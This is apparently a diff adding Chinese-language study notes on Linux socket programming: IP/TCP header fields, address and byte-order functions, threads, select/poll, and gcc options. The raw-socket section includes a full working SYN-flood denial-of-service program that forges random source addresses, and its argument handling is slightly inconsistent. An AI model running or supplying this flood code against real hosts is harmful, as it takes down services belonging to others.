@@ -1,0 +1,910 @@
+* 网络通信三要素
+IP地址
+端口号
+传输协议
+
+* tcp与ip首部格式
+[Network_Programing/IP_Header.jpg]
+[Network_Programing/IP.gif]
+如图，一个刻度表示1个二进制位（比特）。
+1-1.版本4位，表示版本号，目前最广泛的是4=B0100，即常说的IPv4；相信IPv6以后会广泛应用，它能给世界上每个纽扣都分配
+       一个IP地址。
+1-2.头长4位，数据包头部长度。它表示数据包头部包括多少个32位长整型，也就是多少个4字节的数据。无选项则为5（红色部分）。
+1-3.服务类型，包括8个二进制位，每个位的意义如下：
+       过程字段：3位，设置了数据包的重要性，取值越大数据越重要，取值范围为：0（正常）~ 7（网络控制）
+       延迟字段：1位，取值：0（正常）、1（期特低的延迟）
+       流量字段：1位，取值：0（正常）、1（期特高的流量）
+       可靠性字段：1位，取值：0（正常）、1（期特高的可靠性）
+       成本字段：1位，取值：0（正常）、1（期特最小成本）
+       保留字段：1位 ，未使用
+1-4.包裹总长16位，当前数据包的总长度，单位是字节。当然最大只能是65535，及64KB。
+2-1.重组标识16位，发送主机赋予的标识，以便接收方进行分片重组。
+2-2.标志3位，他们各自的意义如下：
+       保留段位(2)：1位，未使用
+       不分段位(1)：1位，取值：0（允许数据报分段）、1（数据报不能分段）
+       更多段位(0)：1位，取值：0（数据包后面没有包，该包为最后的包）、1（数据包后面有更多的包）
+2-3.段偏移量13位，与更多段位组合，帮助接收方组合分段的报文，以字节为单位。
+3-1.生存时间8位，经常ping命令看到的TTL（Time To Live）就是这个，每经过一个路由器，该值就减一，到零丢弃。
+3-2.协议代码8位，表明使用该包裹的上层协议，如TCP=6，ICMP=1，UDP=17等。
+3-3.头检验和16位，是IPv4数据包头部的校验和。
+4-1.源始地址，32位4字节，我们常看到的IP是将每个字节用点（.）分开，如此而已。
+5-1.目的地址，32位，同上。
+6-1.可选选项，主要是给一些特殊的情况使用，往往安全路由会当作攻击而过滤掉，普联（TP_LINK）的TL-ER5110路由就能这么做。
+7-1.用户数据。
+
+[Network_Programing/TCP.gif]
+1-1.源始端口16位，范围当然是0-65535啦。
+1-2.目的端口，同上。
+2-1.数据序号32位，TCP为发送的每个字节都编一个号码，这里存储当前数据包数据第一个字节的序号。
+3-1.确认序号32位，为了安全，TCP告诉接受者希望他下次接到数据包的第一个字节的序号。
+4-1.偏移4位，类似IP，表明数据距包头有多少个32位。
+4-2.保留6位，未使用，应置零。
+4-3.紧急比特URG—当URG＝1时，表明紧急指针字段有效。它告诉系统此报文段中有紧急数据，应尽快传送(相当于高优先级的数据)。
+4-3.确认比特ACK—只有当ACK＝1时确认号字段才有效。当ACK＝0时，确认号无效。参考TCP三次握手
+4-4.复位比特RST(Reset) —当RST＝1时，表明TCP连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新
+       建立运输连接。参考TCP三次握手
+4-5.同步比特SYN—同步比特SYN置为1，就表示这是一个连接请求或连接接受报文。参考TCP三次握手
+4-6.终止比特FIN(FINal)—用来释放一个连接。当FIN＝1时，表明此报文段的发送端的数据已发送完毕，并要求释放运输连接。
+4-7.窗口字段16位，窗口字段用来控制对方发送的数据量，单位为字节。TCP连接的一端根据设置的缓存空间大小确定自己的接收窗口
+       大小，然后通知对方以确定对方的发送窗口的上限。
+5-1.包校验和16位，包括首部和数据这两部分。在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。
+5-2.紧急指针16位，紧急指针指出在本报文段中的紧急数据的最后一个字节的序号。
+6-1.可选选项24位，类似IP，是可选选项。
+6-2.填充8位，使选项凑足32位。
+7-1.用户数据……
+
+* linux套接字类型
+- Socket
+  - INET:  IPv4
+  - INET6: IPv6
+  - SOCK_STREAM
+    - 流式套接字,提供面向连接,可靠的数据传输服务,数据按照字节流,按照顺序收发,保证数据在传输过程中无丢失,无冗余.TCP协议支持该套接字
+  - SOCK_DGRAM
+    - 数据报套接字,提供面向无连接的服务,数据收发无序,不能保证数据的准确到达.UDP协议支持该套接字
+  - SOCK_RAW
+    - 原始套接字.允许对低于传输层的协议或物理网络直接访问,例如可以接受和发送ICMP报.常用于检测新的协议
+
+- TLI
+
+* 套接字基础函数
+
+** 字节排序函数
+#+BEGIN_SRC c
+#include <netinet/in.h>
+uint16_t htons(uint16_t hosts);
+//将16位的短整形数,从主机字节序转换为网络字节序
+uint32_t htonl(uint32_t hostl);
+//将32位的长整形数,从主机字节序转换为网络字节序
+uint16_t ntohs(uint16_t nets);
+//将16位的短整形数,从网络字节序转换为主机字节序
+uint32_t ntohl(uint32_t netl);
+//将16位的长整形数,从网络字节序转换为主机字节序
+
+#+END_SRC
+
+** 字节操纵函数
+#+BEGIN_SRC c
+#include <string.h>
+void bzero(void *dest, size_t len);
+//将目标中指定数目的字节置为0,经常用此函数来对套接字地址结构进行初始化
+void bcopy(const void *src, void *dest, size_t len);
+//将指定数目字节从源拷贝到目标
+void bcmp(const void *src, void *dest, size_t len);
+//比较源和目标两个字符串,若相同返回值为0,否则返回非0
+
+void *memset(void *dest, int x, size_t len);
+//将目标地址开始len个长度设为x
+void *memcpy(void *dest, const void *src, size_t len);
+//当源与目标重叠时, bcopy能够正确处理,而memcpy的操作结果不可知
+int memcmp(const void *str1, const void *str2, size_t len);
+//相同返回0,str1大于str2则返回大于0,否则小于0
+#+END_SRC
+
+** IP地址转换函数
+#+BEGIN_SRC c
+#include <arpa/inet.h>
+in_addr_t inet_addr(const char *str);
+//将字符串形式的IP地址转换成32位二进制的IP地址.str指向字符串形式的IP地址.这个函数不对IP地址的有效性进行验证,所有2^32个可能的二进制值都认为是有效的IP地址.该函数无法处理点分十进制的IP地址:255.255.255.255无法由此函数处理
+int inet_aton(const char *str, struct in_addr *numstr);
+//进行相同的转化.str指向字符串形式的IP地址,numstr指向转换后点分十进制的IP地址.成功返回1失败返回0
+char *int_ntoa(struct in_addr inaddr);
+//将一个32位网络字节序的二进制IP地址转换成相应的点分十进制IP地址.这个函数的参数是一个结构体.函数返回值所指向的串还在静态内存中,所以函数是不可重入的
+以上函数只能处理IPv4
+
+#include <arpa/inet.h>
+//p代表地址的表达格式通常是ASCII字符串,n代表数值格式,是存在套接字地址结构中的二进制值.
+//family参数是指操作的地址族,IPv4是AF_INET,IPv6是AF_INET6
+int inet_pton(int family, const char *str, void *numstr);
+//将str所指的字符串形式的IP地址,转换为网络字节序的二进制IP地址,并用指针numstr存储.成功返回1
+const char *inet_ntop(int family, const void *numstr, char *str, size_t len);
+//进行想法操作,将numstr所值的二进制IP地址转换成字符串形IP地址,并用指针str存储,参数len是目标的大小
+#+END_SRC
+
+** isfdtype函数
+#+BEGIN_SRC c
+#include <sys/stat.h>
+int isfdtype(int fd, int fdtype);
+//测试操作符fd是不是fdtype指定的类型.
+
+#+END_SRC
+
+* 网络字节序和主机字节序转换函数
+见上
+
+* 并发技术
+- 进程
+- 线程
+- I/O多路复用
+
+* 父进程先于子进程结束和晚于子进程结束差异
+一个现有进程可以调用fork函数创建一个新进程。由fork创建的新进程被称为子进程（child process）。fork函数被调用一次但返回两次。两次返回的唯一区别是子进程中返回0值而父进程中返回子进程ID。
+
+1）父进程先于子进程终止
+
+     当父进程先退出时，系统会让init进程接管子进程，该子线程成为了孤儿进程。
+
+2）子进程先于父进程终止
+
+    分为2种情况：
+
+       a）正常情况：父进程调用了wait函数 （非父子进程则用waitpid函数），此时父进程会等待子进程结束。
+
+       b）父进程又没有调用wait函数 （非父子进程则未调用waitpid函数），此种情况子进程进入僵死状态即僵尸进程，并且会一直保持下去直到系统重启。子进程处于僵死状态时，内核只保存进程的一些必要信息以备父进程所需。此时子进程始终占有着资源，同时也减少了系统可以创建的最大进程数。
+
+    僵死状态：一个已经终止、但是其父进程尚未对其进行善后处理(获取终止子进程的有关信息，释放它仍占有的资源)的进程被称为僵死进程(zombie)。ps命令将僵死进程的状态打印为Z 。
+* 僵尸进程
+　　孤儿进程：一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。
+
+　　僵尸进程：一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵死进程。
+
+* 多线程(tcp和udp) 并发服务器编程模板以及例程
+
+* 线程基础函数
+
+#+BEGIN_SRC c
+#include <pthread.h>
+int pthread_create(pthread_t *tid, const pthread_attr_t *attr, void *(func)(void *), viod *arg);
+//如果新线程创建成功,参数tid返回新生成的线程ID.一个进程中的每个线程都由一个线程ID标识,其类型为pthread_t, attr指向线程属性指针.每个线程有很多属性.通常将attr的参数值设置为NULL,这时使用系统的默认属性.
+//创建完线程后, 需要说明它将执行的函数.函数地址由func制定,该参数必须是个静态函数,它只有一个通用指针作为参数,并返回一个通用指针.该执行函数的调用参数是由arg指定,arg是一个通用指针,用于往func函数中传递参数.如果需要传递多个参数,必须将它们打包成一个结构,然后让arg指向该结构
+
+int pthread_jion(pthread_t tid, void **status);
+//函数与进程的waitpid函数功能类似,等待一个线程终止
+//参数tid指定所等待的线程ID.该函数必须指定要等待的线程,不能等待任一个线程结束.要求等待的线程必须是当前进程的成员,并且不是分离的线程或者守护线程.几个线程不能同时等待一个线程完成,如果其中一个成功调用pthread_jion函数,其他线程将返回ESRCH错误,如果等待的线程已经终止,则该函数立即返回.如果参数status指针非空,则指向终止线程的推出状态值.调用成功返回0
+
+int pthread_detach(pthread_t tid);
+//tid为要分离线程的ID,函数成功返回0
+
+pthread_t pthread_self(void);
+//函数返回调用函数的线程ID
+
+void pthread_exit(void *status);
+//函数用于终止当前线程,并返回状态值,如果当前线程是可联合的,则其推出状态将保留
+#+END_SRC
+
+* 分离线程
+
+线程分为两类:可联合的和分离的,默认情况下线程都是可联合的.
+可联合的线程终止时,其线程ID和终止状态将保留,直到线程调用pthread_jion函数.
+而分离线程退出后,系统将释放其所有资源,其他线程不能等待其终止.如果一个线程需要知道另一个线程什么时候终止,最好保留第二个线程的可联合性.
+
+* 互斥锁作用
+在编程中，引入了对象互斥锁的概念，来保证共享数据操作的完整性。每个对象都对应于一个可称为" 互斥锁" 的标记，这个标记用来保证在任一时刻，只能有一个线程访问该对象。
+
+* 多线程中传参数的几种方法有何差异
+
+* 线程安全性TSD编程例程
+
+* I/O复用技术和相关函数
+- 阻塞I/O
+- 非阻塞I/O
+- I/O复用
+- 信号驱动I/O(同步I/O)
+- 异步I/O
+
+** 相关函数
+*** select
+#+BEGIN_SRC c
+  #include <sys/select.h>
+  #include <sys/time.h>
+  int select(int maxfdp, fd_set *readset, fd_set *writeset, fd_set *execepset, const struct timeval *timeout);
+
+  struct timeval{
+      long tv_sec;
+      long tv_usec;
+  };
+  /*
+    timeval 结构可以提供秒数,毫秒数成员.
+    这个timeval有三种可能
+    永远等待下去:仅在有一个描述字准备好I/O时才返回,因此我们可以将参数timeout设置为空指针
+    等待固定时间:在有一个描述字准备好I/O时才返回,但不超过由timeout参数所指定timeval结构中指定的秒数和微秒数
+    根本不用等待:检查描述字后立即返回,这称为轮询
+    在前两种情况的等待中,如果进程捕获了一个人信号,并从信号处理程序返回,那么等待一般被中断.
+    参数readset,writeset和execpset指定让内核测试读,写,异常条件的描述字.如果不感兴趣,可将其设置为NULL
+
+    select函数使用描述字集为参数readset(writeset或execptset)指定多个描述字.描述字集是一个整数数组,每个数中的每一个对应于一个描述字,例如32位整数,则数组的第一个元素对应0-31描述字,第二个元素对应于32-63描述字.下面介绍下面几个描述字的宏
+  ,*/
+
+  void FD_ZERO(fd_set *fdset); //将所有位设为0
+  void FD_SET(int fd, fd_set *fdset); //将fd位设为1
+  void FD_CLR(int fd, fd_set *fdset); //将fd位设为0
+  int FD_ISSET(int fd, fd_set *fdset); //检测fd位是否为1
+
+  //example
+  fd_set fdset; //声明fdset
+  FD_ZERO(&fdset); //初始化fdset
+  FD_SET(1, &fdset); //将fd为1的描述字设为1
+  FD_SET(2, &fdset); //将fd为2的描述字设为1
+  FD_CLR(3, &fdset); //将fd为3的描述字设为0
+#+END_SRC
+
+*** shutdown
+以前终止连接的方式是调用close函数,该函数并不进行真正的四分组终止序列,而是将描述字的访问次数减1,仅在此计数为0的时候才关闭套接字,发送TCP的正常连接终止序列,在此close有两个限制可以由本节介绍的函数shutdown来避免
+- close将描述字的访问次数减1,仅在此计数为0的时候才关闭套接字.用shutdown可以激发TCP的正常连接终止序列,而不管访问计数.
+- close终止了数据传输的两个方向:读和写,由于TCP是全双工的,有很多时候,要通知另一端已经完成了数据发送,即使那一端仍有许多数据要发送也是如此.shutdown函数可以仅仅关闭连接的读,写或两个方向都关闭
+
+#+BEGIN_SRC c
+#include <sys/socket.h>
+int shutdown(int sockfd, int howto);
+/*
+返回0成功
+sockfd为要关闭的套接口描述字
+howto为以下常值:
+SHUT_RD:关闭连接读的这一半,不再接受套接口中的数据,而留在套接口接受缓冲区中的数据都作废.进程不再能够对套接字执行任何读函数.调用此函数后,TCP套接口接受的任何数据都被确认,但数据本身扔掉
+SHUT_WD:关闭连接写的这一半,在TCP场合下,这种情况称为半关闭(half_close).当前留在套接口发送缓冲区的数据都被发送,后跟正常的TCP连接终止序列,进程不能再执行对套接口的任何写函数.
+*/
+
+#+END_SRC
+
+*** poll
+
+#+BEGIN_SRC c
+  #include <poll.h>
+  int poll(struct pollfd *fdarray, unsigned long nfds, int timeout);
+  //返回准备好的描述字个数, 0---超时, 1---出错
+  /*
+  第一个参数是指向结构数组第一个元素的指针,每个数组的元素都是一个pollfd结构,它规定了为测试一给定描述字fd的一些条件.下面是polled结构的源码
+  ,*/
+  struct pollfd{
+      int fd;
+      short events;
+      shortevent;
+  };
+
+  /*
+  要测试的条件由成员events规定,函数在相应的revents成员中返回描述字的状态(每个描述字有两个变量,一个为调用值,一个为结果,以此避免使用值-结果参数.回想一下,函数select的中间三个参数都是值-结果参数).这两个成员中的每一个都由指定某个条件的一位或多位组成.下面列出了用于指定标志位events并测试标志位revents的一些常值:
+  POLLIN: 普通或优先级带数据可读,revent&events
+  POLLRDNORN: 普通数据可读,revent&events
+  ROLLRDBAD: 优先级带数据可读,revent&events
+  POLLPRI: 高优先级带数据可读,revent&events
+  POLLOUT: 普通或优先级带数据可写,revent&events
+  POLLWRNORM: 普通数据可写,revent&events
+  POLLWRBAND: 优先级带数据可写,revent&events
+  POLLERR: 发生错误,revents
+  POLLHUP: 发生挂起,revents
+  POLLNVAL: 套接字不是一个打开的文件,revents
+  其中,前4个常值是处理套接口输入的,中间3个是处理输出的,而最后3个是处理错误的,因此只能在revents中返回.在流设备中,将数据分为普通,优先级,高优先级3种.
+
+  对于TCP和UDP套接口,将引起poll返回的revents具体化:
+  所有正规TCP数据和UDP数据都被认为是普通数据
+  TCP的带外数据被认为是优先级带数据
+  当TCP连接的读的这一半关闭时,(例如收到一个FIN),这也认为是普通数据,且后续的读操作将返回0.TCP连接存在错误既可认为是普通数据,也可认为是POLLERR错误.无论那种情况,后续读操作将返回-1,并设置error,这就是处理了诸如接收RST或者超时等条件
+  在监听套接口上新连接的可用性既可认为是普通数据,也可认为是优先级数据,大多数实现都将其做为普通数据考虑
+
+  而第二个参数,结构数组中元素的个数是由参数nfds来规定的,参数timeout同select中timeout功能一样,指定函数返回前等待多少时间
+  大于0,等待知道数目的时间
+  等于0,立即返回,不阻塞
+  INFTIM,永远等待
+  ,*/
+
+#+END_SRC
+
+* 非阻塞IO工作模式
+
+* 同步io 与异步io
+
+* 域名解析相关函数
+
+* 获取本地址和远程地址方法
+
+** gethostbyname
+该函数如果执行成功就返回一个指向结构hostent的指针,如果失败返回空指针
+#+BEGIN_SRC c
+  #include <netdb.h>
+  struct hostent {
+      char *h_name; // 主机的正式名称
+      char **h_aliases; // 主机的别名列表
+      int h_addrtype; //主机地址类型
+      int h_length; //主机地址长度
+      char **h_addr_list; //主机IP地址列表
+  };
+  #define haddr h_addr_list[0] // 在列表中的第一个地址
+
+#+END_SRC
+
+
+* 原始套接字作用以及创建方式
+基于原始套接字编程
+       在开发面向连接的TCP和面向无连接的UDP程序时，我们所关心的核心问题在于数据收发层面，数据的传输特性由TCP或UDP来保证：
+[SOCK_RAW/raw_1.jpg]
+也就是说，对于TCP或UDP的程序开发，焦点在Data字段，我们没法直接对TCP或UDP头部字段进行赤裸裸的修改，当然还有IP头。换句话说，我们对它们头部操作的空间非常受限，只能使用它们已经开放给我们的诸如源、目的IP，源、目的端口等等。
+今天我们讨论一下原始套接字的程序开发，用它作为入门协议栈的进阶跳板太合适不过了。OK闲话不多说，进入正题。
+原始套接字的创建方法也不难：socket(AF_INET, SOCK_RAW, protocol)。
+重点在protocol字段，这里就不能简单的将其值为0了。在头文件netinet/in.h中定义了系统中该字段目前能取的值，注意：有些系统中不一定实现了netinet/in.h中的所有协议。源代码的linux/in.h中和netinet/in.h中的内容一样。
+
+[SOCK_RAW/raw_2.jpg]
+
+ 我们常见的有IPPROTO_TCP，IPPROTO_UDP和IPPROTO_ICMP，在博文“(十六)洞悉linux下的Netfilter&iptables：开发自己的hook函数【实战】(下) ”中我们见到该protocol字段为IPPROTO_RAW时的情形，后面我们会详细介绍。
+       用这种方式我就可以得到原始的IP包了，然后就可以自定义IP所承载的具体协议类型，如TCP，UDP或ICMP，并手动对每种承载在IP协议之上的报文进行填充。接下来我们看个最著名的例子DOS攻击的示例代码，以便大家更好的理解如何基于原始套接字手动去封装我们所需要TCP报文。
+       先简单复习一下TCP报文的格式，因为我们本身不是讲协议的设计思想，所以只会提及和我们接下来主题相关的字段，如果想对TCP协议原理进行深入了解那么《TCP/IP详解卷1》无疑是最好的选择。
+
+[SOCK_RAW/raw_3.jpg]
+
+我们目前主要关注上面着色部分的字段就OK了，接下来再看看TCP3次握手的过程。TCP的3次握手的一般流程是：
+(1) 第一次握手：建立连接时，客户端A发送SYN包(SEQ_NUMBER=j)到服务器B，并进入SYN_SEND状态，等待服务器B确认。
+(2) 第二次握手：服务器B收到SYN包，必须确认客户A的SYN(ACK_NUMBER=j+1)，同时自己也发送一个SYN包(SEQ_NUMBER=k)，即SYN+ACK包，此时服务器B进入SYN_RECV状态。
+(3) 第三次握手：客户端A收到服务器B的SYN＋ACK包，向服务器B发送确认包ACK(ACK_NUMBER=k+1)，此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。
+ 至此3次握手结束，TCP通路就建立起来了，然后客户端与服务器开始交互数据。上面描述过程中，SYN包表示TCP数据包的标志位syn=1，同理，ACK表示TCP报文中标志位ack=1，SYN+ACK表示标志位syn=1和ack=1同时成立。
+原始套接字还提供了一个非常有用的参数IP_HDRINCL：
+1、当开启该参数时：我们可以从IP报文首部第一个字节开始依次构造整个IP报文的所有选项，但是IP报文头部中的标识字段(设置为0时)和IP首部校验和字段总是由内核自己维护的，不需要我们关心。
+2、如果不开启该参数：我们所构造的报文是从IP首部之后的第一个字节开始，IP首部由内核自己维护，首部中的协议字段被设置成调用socket()函数时我们所传递给它的第三个参数。
+ 开启IP_HDRINCL特性的模板代码一般为：
+       const int on =1;
+  if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+printf("setsockopt error!\n");
+  }
+      所以，我们还得复习一下IP报文的首部格式：
+
+[SOCK_RAW/raw_4.jpg]
+
+同样，我们重点关注IP首部中的着色部分区段的填充情况。
+有了上面的知识做铺垫，接下来DOS示例代码的编写就相当简单了。我们来体验一下手动构造原生态IP报文的乐趣吧
+#+BEGIN_SRC c
+//mdos.c
+#include <stdlib.h>
+#include <stdio.h>
+#include <errno.h>
+#include <string.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <arpa/inet.h>
+#include <linux/tcp.h>
+
+//我们自己写的攻击函数
+void attack(int skfd,struct sockaddr_in *target,unsigned short srcport);
+//如果什么都让内核做，那岂不是忒不爽了，咱也试着计算一下校验和。
+unsigned short check_sum(unsigned short *addr,int len);
+
+int main(int argc,char** argv){
+        int skfd;
+        struct sockaddr_in target;
+        struct hostent *host;
+        const int on=1;
+        unsigned short srcport;
+
+        if(argc!=2)
+        {
+                printf("Usage:%s target dstport srcport\n",argv[0]);
+                exit(1);
+        }
+
+        bzero(&target,sizeof(struct sockaddr_in));
+        target.sin_family=AF_INET;
+        target.sin_port=htons(atoi(argv[2]));
+
+        if(inet_aton(argv[1],&target.sin_addr)==0)
+        {
+                host=gethostbyname(argv[1]);
+                if(host==NULL)
+                {
+                        printf("TargetName Error:%s\n",hstrerror(h_errno));
+                        exit(1);
+                }
+                target.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
+        }
+
+        //将协议字段置为IPPROTO_TCP，来创建一个TCP的原始套接字
+        if(0>(skfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))){
+                perror("Create Error");
+                exit(1);
+        }
+
+        //用模板代码来开启IP_HDRINCL特性，我们完全自己手动构造IP报文
+         if(0>setsockopt(skfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))){
+                perror("IP_HDRINCL failed");
+                exit(1);
+        }
+
+        //因为只有root用户才可以play with raw socket :)
+        setuid(getpid());
+        srcport = atoi(argv[3]);
+        attack(skfd,&target,srcport);
+}
+
+//在该函数中构造整个IP报文，最后调用sendto函数将报文发送出去
+void attack(int skfd,struct sockaddr_in *target,unsigned short srcport){
+        char buf[128]={0};
+        struct ip *ip;
+        struct tcphdr *tcp;
+        int ip_len;
+
+        //在我们TCP的报文中Data没有字段，所以整个IP报文的长度
+        ip_len = sizeof(struct ip)+sizeof(struct tcphdr);
+        //开始填充IP首部
+        ip=(struct ip*)buf;
+
+        ip->ip_v = IPVERSION;
+        ip->ip_hl = sizeof(struct ip)>>2;
+        ip->ip_tos = 0;
+        ip->ip_len = htons(ip_len);
+        ip->ip_id=0;
+        ip->ip_off=0;
+        ip->ip_ttl=MAXTTL;
+        ip->ip_p=IPPROTO_TCP;
+        ip->ip_sum=0;
+        ip->ip_dst=target->sin_addr;
+
+        //开始填充TCP首部
+        tcp = (struct tcphdr*)(buf+sizeof(struct ip));
+        tcp->source = htons(srcport);
+        tcp->dest = target->sin_port;
+        tcp->seq = random();
+        tcp->doff = 5;
+        tcp->syn = 1;
+        tcp->check = 0;
+
+        while(1){
+                //源地址伪造，我们随便任意生成个地址，让服务器一直等待下去
+                ip->ip_src.s_addr = random();
+                tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
+                sendto(skfd,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
+        }
+}
+
+//关于CRC校验和的计算，网上一大堆，我就“拿来主义”了
+unsigned short check_sum(unsigned short *addr,int len){
+        register int nleft=len;
+        register int sum=0;
+        register short *w=addr;
+        short answer=0;
+
+        while(nleft>1)
+        {
+                sum+=*w++;
+                nleft-=2;
+        }
+        if(nleft==1)
+        {
+                *(unsigned char *)(&answer)=*(unsigned char *)w;
+                sum+=answer;
+        }
+
+        sum=(sum>>16)+(sum&0xffff);
+        sum+=(sum>>16);
+        answer=~sum;
+        return(answer);
+}
+#+END_SRC
+
+用前面我们自己编写TCP服务器端程序来做本地测试，看看效果。先把服务器端程序启动起来，如下：
+
+[SOCK_RAW/raw_5.jpg]
+
+ 然后，我们编写的“捣蛋”程序登场了：
+
+[SOCK_RAW/raw_6.jpg]
+
+ 该“mdos”命令执行一段时间后，服务器端的输出如下：
+
+[SOCK_RAW/raw_7.jpg]
+
+因为我们的源IP地址是随机生成的，源端口固定为8888，服务器端收到我们的SYN报文后，会为其分配一条连接资源，并将该连接的状态置为SYN_RECV，然后给客户端回送一个确认，并要求客户端再次确认，可我们却不再bird别个了，这样就会造成服务端一直等待直到超时。
+备注：本程序仅供交流分享使用，不要做恶，不然后果自负哦。
+最后补充一点，看到很多新手经常对struct ip{}和struct iphdr{}，struct icmp{}和struct icmphdr{}纠结来纠结去了，不知道何时该用哪个。在/usr/include/netinet目录这些结构所属头文件的定义，头文件中对这些结构也做了很明确的说明，这里我们简单总结一下：
+struct ip{}、struct icmp{}是供BSD系统层使用，struct iphdr{}和struct icmphdr{}是在INET层调用。同理tcphdr和udphdr分别都已经和谐统一了，参见tcp.h和udp.h。
+BSD和INET的解释在协议栈篇章详细论述，这里大家可以简单这样来理解：我们在用户空间的编写网络应用程序的层次就叫做BSD层。所以我们该用什么样的数据结构呢？良好的编程习惯当然是BSD层推荐我们使用的，struct ip{}、struct icmp{}。至于INET层的两个同类型的结构体struct iphdr{}和struct icmphdr{}能用不？我只能说不建议。看个例子：
+
+[SOCK_RAW/raw_8.jpg]
+
+我们可以看到无论BSD还是INET层的IP数据包结构体大小是相等的，ICMP报文的大小有差异。而我们知道ICMP报头应该是8字节，那么BSD层为什么是28字节呢？留给大家思考。也就是说，我们这个mdos.c的实例程序中除了用struct ip{}之外还可以用INET层的struct iphdr{}结构。将如下代码：
+#+BEGIN_SRC c
+struct ip *ip;
+…
+ip=(struct ip*)buf;
+ip->ip_v = IPVERSION;
+ip->ip_hl = sizeof(struct ip)>>2;
+ip->ip_tos = 0;
+ip->ip_len = htons(ip_len);
+ip->ip_id=0;
+ip->ip_off=0;
+ip->ip_ttl=MAXTTL;
+ip->ip_p=IPPROTO_TCP;
+ip->ip_sum=0;
+ip->ip_dst=target->sin_addr;
+…
+ip->ip_src.s_addr = random();
+#+END_SRC
+
+改成:
+
+#+BEGIN_SRC c
+struct iphdr *ip;
+…
+ip=(struct iphdr*)buf;
+ip->version = IPVERSION;
+ip->ihl = sizeof(struct ip)>>2;
+ip->tos = 0;
+ip->tot_len = htons(ip_len);
+ip->id=0;
+ip->frag_off=0;
+ip->ttl=MAXTTL;
+ip->protocol=IPPROTO_TCP;
+ip->check=0;
+ip->daddr=target->sin_addr.s_addr;
+…
+ip->saddr = random();
+
+#+END_SRC
+
+结果请童鞋们自己验证。虽然结果一样，但在BSD层直接使用INET层的数据结构还是不被推荐的。
+小结：
+1、IP_HDRINCL选项可以使我们控制到底是要从IP头部第一个字节开始构造我们的原始报文或者从IP头部之后第一个数据字节开始。
+2、只有超级用户才能创建原始套接字。
+3、原始套接字上也可以调用connet、bind之类的函数，但都不常见。原因请大家回顾一下这两个函数的作用。想不起来的童鞋回头复习一下前两篇的内容吧。
+
+* GCC编译器使用
+
+1.预处理,生成.i的文件[预处理器cpp]
+2.将预处理后的文件不转换成汇编语言,生成文件.s[编译器egcs]
+3.有汇编变为目标代码(机器代码)生成.o的文件[汇编器as]
+4.连接目标代码,生成可执行程序[链接器ld]
+
+gcc
+-g 允许调试
+-o 指定输出文件名
+-pthread 以便使用线程相关头文件
+
+[参数详解]
+-x language filename
+　 设定文件所使用的语言,使后缀名无效,对以后的多个有效.也就是根据约定C语言的后
+缀名称是.c的，而C++的后缀名是.C或者.cpp,如果你很个性，决定你的C代码文件的后缀
+名是.pig 哈哈，那你就要用这个参数,这个参数对他后面的文件名都起作用，除非到了
+下一个参数的使用。
+　　可以使用的参数吗有下面的这些
+　　`c', `objective-c', `c-header', `c++', `cpp-output', `assembler', and `a
+ssembler-with-cpp'.
+　　看到英文，应该可以理解的。
+　　例子用法:
+　　gcc -x c hello.pig
+　　
+-x none filename
+　　关掉上一个选项，也就是让gcc根据文件名后缀，自动识别文件类型
+　　例子用法:
+　　gcc -x c hello.pig -x none hello2.c
+　　
+-c
+　　只激活预处理,编译,和汇编,也就是他只把程序做成obj文件
+　　例子用法:
+　　gcc -c hello.c
+　　他将生成.o的obj文件
+-S
+　　只激活预处理和编译，就是指把文件编译成为汇编代码。
+　　例子用法
+　　gcc -S hello.c
+　　他将生成.s的汇编代码，你可以用文本编辑器察看
+-E
+　　只激活预处理,这个不生成文件,你需要把它重定向到一个输出文件里面.
+　　例子用法:
+　　gcc -E hello.c > pianoapan.txt
+　　gcc -E hello.c | more
+　　慢慢看吧,一个hello word 也要与处理成800行的代码
+-o
+　　制定目标名称,缺省的时候,gcc 编译出来的文件是a.out,很难听,如果你和我有同感
+，改掉它,哈哈
+　　例子用法
+　　gcc -o hello.exe hello.c (哦,windows用习惯了)
+　　gcc -o hello.asm -S hello.c
+-pipe
+　　使用管道代替编译中临时文件,在使用非gnu汇编工具的时候,可能有些问题
+　　gcc -pipe -o hello.exe hello.c
+-ansi
+　　关闭gnu c中与ansi c不兼容的特性,激活ansi c的专有特性(包括禁止一些asm inl
+ine typeof关键字,以及UNIX,vax等预处理宏,
+-fno-asm
+　　此选项实现ansi选项的功能的一部分，它禁止将asm,inline和typeof用作关键字。
+　　　　
+-fno-strict-prototype
+　　只对g++起作用,使用这个选项,g++将对不带参数的函数,都认为是没有显式的对参数
+的个数和类型说明,而不是没有参数.
+　　而gcc无论是否使用这个参数,都将对没有带参数的函数,认为城没有显式说明的类型
+
+　　
+-fthis-is-varialble
+　　就是向传统c++看齐,可以使用this当一般变量使用.
+　　
+-fcond-mismatch
+　　允许条件表达式的第二和第三参数类型不匹配,表达式的值将为void类型
+　　
+-funsigned-char
+-fno-signed-char
+-fsigned-char
+-fno-unsigned-char
+　　这四个参数是对char类型进行设置,决定将char类型设置成unsigned char(前两个参
+数)或者 signed char(后两个参数)
+　　
+-include file
+　　包含某个代码,简单来说,就是便以某个文件,需要另一个文件的时候,就可以用它设
+定,功能就相当于在代码中使用#include<filename>
+　　例子用法:
+　　gcc hello.c -include /root/pianopan.h
+　　
+-imacros file
+　　将file文件的宏,扩展到gcc/g++的输入文件,宏定义本身并不出现在输入文件中
+　　
+-Dmacro
+　　相当于C语言中的#define macro
+　　
+-Dmacro=defn
+　　相当于C语言中的#define macro=defn
+　　
+-Umacro
+　　相当于C语言中的#undef macro
+-undef
+　　取消对任何非标准宏的定义
+　　
+-Idir
